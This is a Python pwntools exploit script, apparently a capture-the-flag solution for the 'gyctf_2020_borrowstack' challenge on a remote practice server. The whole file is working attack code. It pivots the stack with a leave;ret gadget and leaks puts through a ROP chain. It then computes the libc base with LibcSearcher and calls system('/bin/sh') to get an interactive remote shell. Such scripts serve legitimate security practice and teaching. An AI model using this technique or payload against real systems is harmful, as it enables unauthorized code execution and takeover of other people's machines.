# coding:utf-8

from pwn import *
from LibcSearcher import *

context.log_level = 'debug'

proc_name = 'gyctf_2020_borrowstack'
#p = process(proc_name)
p = remote('node3.buuoj.cn',28599)
elf = ELF(proc_name)

padding = 'a' * 0x60
bank_addr = 0x0601080
leave_ret = 0x0400699

p.recvuntil('you want')
sleep(1)
payload1 = padding + p64(bank_addr) + p64(leave_ret)
p.send(payload1)

puts_got = elf.got['puts']
#puts_plt = elf.plt['puts']
puts_plt = 0x04004e0
pop_rdi_ret = 0x0400703     # search pop rdi; ret
main_addr = elf.sym['main']
ret_addr = 0x04004c9

payload2 = p64(ret_addr) * 0x14 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)

p.recvuntil('You can check and use your borrow stack now!')
sleep(1)
p.send(payload2)
p.recvline()
puts_addr = u64(p.recv(6).ljust(8,'\x00'))
print('puts_addr: ', hex(puts_addr))

libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
str_bin_sh = libc_base + libc.dump('str_bin_sh')

payload3 = p64(pop_rdi_ret) + p64(str_bin_sh) + p64(system_addr)
sleep(1)
p.send(payload3)

p.interactive()
